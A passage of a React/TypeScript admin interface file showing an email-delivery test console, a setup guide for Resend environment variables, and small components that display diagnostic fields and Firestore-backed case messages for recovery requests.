                  className="px-6 bg-amber-500 hover:bg-amber-400 disabled:opacity-50 disabled:cursor-not-allowed text-slate-950 font-mono font-black text-xs uppercase tracking-widest rounded-xl transition-all cursor-pointer flex items-center gap-2 shrink-0"
                >
                  {testLoading ? (
                    <>
                      <div className="w-3.5 h-3.5 border-2 border-slate-950/30 border-t-slate-950 rounded-full animate-spin"></div>
                      TESTING...
                    </>
                  ) : (
                    <>
                      <PlayIcon size={14} />
                      EXECUTE
                    </>
                  )}
                </button>
              </div>
              {!healthData?.smtpDetails?.user && (
                <p className="text-[9px] text-red-400 font-mono uppercase tracking-widest">
                  ⚠ Test blocked: RESEND_API_KEY not configured on server
                </p>
              )}
            </form>

            {/* Test Connection Results Console Panel */}
            {testResult && (
              <div className="space-y-4">
                <div className="h-px bg-white/5"></div>
                <div className="space-y-2">
                  <div className="flex justify-between items-center text-[10px] font-mono uppercase">
                    <span className="text-slate-500 tracking-widest">TRANSMISSION_FEEDBACK</span>
                    <span className={testResult.success ? "text-emerald-400 font-bold" : "text-red-400 font-bold"}>
                      {testResult.success ? "RESPONSE_OK_200" : "HANDSHAKE_FAILURE"}
                    </span>
                  </div>

                  <div className={`p-4 rounded-xl border font-mono text-xs overflow-x-auto space-y-2 max-h-[250px] custom-scrollbar ${
                    testResult.success 
                      ? 'bg-emerald-500/5 border-emerald-500/10 text-emerald-300' 
                      : 'bg-red-500/5 border-red-500/10 text-red-300'
                  }`}>
                    {testResult.success ? (
                      <>
                        <p className="font-bold">✓ Connected & Mail Transmitted successfully!</p>
                        <p className="text-[10px] text-slate-400">Message ID: {testResult.messageId}</p>
                        <p className="text-[10px] text-slate-400">Response: {testResult.response}</p>
                        <p className="text-[10px] text-slate-400">Recipient: {testResult.recipient}</p>
                        <p className="text-[10px] text-emerald-500 italic mt-2">Check your spam folder if it doesn't arrive in your inbox shortly.</p>
                      </>
                    ) : (
                      <>
                        <p className="font-bold">✗ SMTP Handshake / Dispatch Failed:</p>
                        <p className="text-[11px] bg-black/40 p-3 rounded-lg border border-red-500/10 text-red-200 whitespace-pre-wrap leading-relaxed select-all">
                          {testResult.error || "Unknown Error"}
                        </p>
                        
                        {testResult.suggestions && testResult.suggestions.length > 0 ? (
                          <div className="pt-3 border-t border-red-500/15 mt-3 space-y-2 text-[10px] text-amber-200 bg-amber-500/5 p-3 rounded-lg">
                            <p className="font-bold text-white uppercase tracking-wider">TAILORED RECOVERY ACTION PLAN:</p>
                            {testResult.suggestions.map((sug: string, idx: number) => (
                              <p key={idx} className="leading-relaxed pl-3 border-l border-amber-500/30">
                                • {sug}
                              </p>
                            ))}
                          </div>
                        ) : (
                          <div className="pt-2 text-[10px] text-slate-400 space-y-1">
                            <p className="font-bold text-white uppercase tracking-wider mb-1">Common Fix Actions:</p>
                            <p>• <strong>Password is Wrong</strong>: Email accounts require a secure "App Password" rather than your portal sign-in password if multi-factor is on.</p>
                            <p>• <strong>Port Blocking</strong>: Secure port `465` (SSL) is our default. Try using `587` in settings if your provider uses TLS/STARTTLS.</p>
                            <p>• <strong>IP Blocking</strong>: Titan/Google may restrict SMTP relays from automated Cloud Run environments. Whitelist SMTP logins in your mailbox control panel.</p>
                          </div>
                        )}
                      </>
                    )}
                  </div>
                </div>
              </div>
            )}
          </div>
        </div>
      </div>

      {/* Secrets Setup Step-by-Step Walkthrough Guide */}
      <div className="glass-panel p-6 sm:p-8 rounded-2xl border border-white/5 space-y-6">
        <h3 className="text-sm font-manrope font-black text-white uppercase tracking-tight flex items-center gap-2">
          <AlertIcon size={18} className="text-amber-500" /> RESEND SETUP (HOSTINGER ENV VARS)
        </h3>

        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 font-mono text-xs text-slate-400 leading-relaxed">
          <div className="space-y-2 p-4 rounded-xl bg-white/5 border border-white/5">
            <span className="text-amber-500 font-bold">1. SECURE CREDENTIALS</span>
            <p className="text-[11px]">
              Access the **Settings &gt; Secrets / Environment Variables** menu in your AI Studio application builder (upper right corner).
            </p>
          </div>

          <div className="space-y-2 p-4 rounded-xl bg-white/5 border border-white/5">
            <span className="text-amber-500 font-bold">2. ADD CORRESPONDING KEYS</span>
            <p className="text-[11px]">
              Input the required keys precisely (Capitalization and structure matter):
            </p>
            <div className="bg-[#05070a]/80 p-2.5 rounded border border-white/5 space-y-1 text-[9px] text-blue-400 select-all">
              <p>• RESEND_API_KEY</p>
              <p>• RESEND_FROM</p>
              <p>• ADMIN_EMAIL</p>
              <p>• ADMIN_EMAIL</p>
            </div>
          </div>

          <div className="space-y-2 p-4 rounded-xl bg-white/5 border border-white/5 sm:col-span-2 lg:col-span-1">
            <span className="text-amber-500 font-bold">3. RESTART DEV SERVER</span>
            <p className="text-[11px]">
              Once saved, make sure to <strong>Restart Dev Server</strong> in the AI Studio conversation or file manager so the container gets bootloaded with your new active secrets!
            </p>
          </div>
        </div>
      </div>
    </motion.div>
  );
};

const DiagnosticField = ({ label, value, status, onCopy }: { label: string, value: string, status: "VALID" | "MISSING" | "PENDING", onCopy: () => void }) => (
  <div className="p-3 bg-black/20 border border-white/5 rounded-xl flex items-center justify-between gap-4 font-mono text-[10px]">
    <div className="min-w-0">
      <div className="flex items-center gap-2 mb-1">
        <button 
          onClick={onCopy}
          type="button" 
          className="text-slate-500 hover:text-blue-400 hover:underline transition-all cursor-pointer text-[9px]"
          title="Click to copy Key ID"
        >
          {label}
        </button>
        <span className={`px-1.5 py-0.5 rounded text-[8px] font-bold uppercase tracking-widest ${
          status === 'VALID' ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/20' :
          status === 'MISSING' ? 'bg-red-500/10 text-red-400 border border-red-500/20' :
          'bg-slate-500/10 text-slate-400 border border-slate-500/20'
        }`}>{status}</span>
      </div>
      <p className={`truncate text-xs ${status === 'MISSING' ? 'text-slate-600 italic' : 'text-white'}`}>{value}</p>
    </div>
  </div>
);

const DataField = ({ label, value, isSecret, isHighlighted }: { label: string, value: string, isSecret?: boolean, isHighlighted?: boolean }) => (
  <div className="space-y-1.5 group">
    <p className="text-[9px] font-mono text-slate-500 uppercase tracking-widest group-hover:text-blue-500 transition-colors">{label}</p>
    <div className={`p-3 rounded-lg border font-mono text-[10px] transition-all ${
      isHighlighted 
        ? 'bg-blue-600/20 border-blue-500 text-blue-100 shadow-[0_0_15px_#0062ff22] font-bold' 
        : isSecret 
          ? 'bg-[#05070a] border-white/5 text-slate-700 italic' 
          : 'bg-[#05070a] border-white/5 text-white'
    }`}>
      {value}
    </div>
  </div>
);

const CaseMessages = ({ requestId }: { requestId: string }) => {
  const [messages, setMessages] = React.useState<any[]>([]);

  React.useEffect(() => {
    const q = query(
      collection(db, 'recovery_requests', requestId, 'messages'),
      orderBy('createdAt', 'asc')
    );
    const unsubscribe = onSnapshot(q, (snapshot) => {
      setMessages(snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() })));
    });
    return () => unsubscribe();
  }, [requestId]);

  return (
    <div className="space-y-4">
      {messages.map(msg => (
        <div key={msg.id} className={`flex flex-col ${msg.senderId === 'admin' ? 'items-end' : 'items-start'}`}>
          <div className={`max-w-[90%] p-3 rounded-xl border ${
            msg.senderId === 'admin' 
              ? 'bg-blue-600/10 border-blue-500/30 text-blue-100 rounded-tr-none' 
              : 'bg-white/5 border-white/10 text-white rounded-tl-none'
          }`}>
            {msg.text}
          </div>
          <span className="text-[8px] text-slate-600 mt-1 uppercase tracking-tighter">
            {msg.sender} // {msg.createdAt?.toDate?.()?.toLocaleTimeString()}
          </span>
        </div>
      ))}
    </div>
  );
};

export default CaseManagerView;
